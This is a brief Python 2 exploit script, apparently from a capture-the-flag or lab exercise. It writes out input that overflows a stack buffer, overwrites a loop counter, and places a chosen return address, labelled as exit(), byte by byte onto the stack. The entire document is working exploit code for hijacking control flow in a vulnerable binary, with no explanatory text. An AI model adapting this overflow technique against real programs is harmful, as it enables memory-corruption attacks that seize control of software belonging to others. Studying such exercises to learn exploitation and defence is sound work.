#! /usr/bin/python2

print("__________")  # To be read into `plaintext`

payload = (
    0x080507f0,  # exit()
)

# Note i is currently being overwritten by the newline character!
#            &i   - &buffer
len_buffer = 0x28 - 0x1c

# Fill stack until the return address
for i in range(24):
    print("\x00" + "B" * (len_buffer - 1))

# Write our required return address and data to the stack
byte_mask = (0b1 << 8) - 1
for word in payload:
    assert (word >> 32) == 0  # 4 byte address
    for i in range(4):
        byte = word & byte_mask
        print(chr(byte) + "B" * (len_buffer - 1))
        word >>= 8

# Finish writing data with a dummy byte
print("\x00" + "B" * (len_buffer - 1) + chr(9) + chr(0) + chr(0) + chr(0))
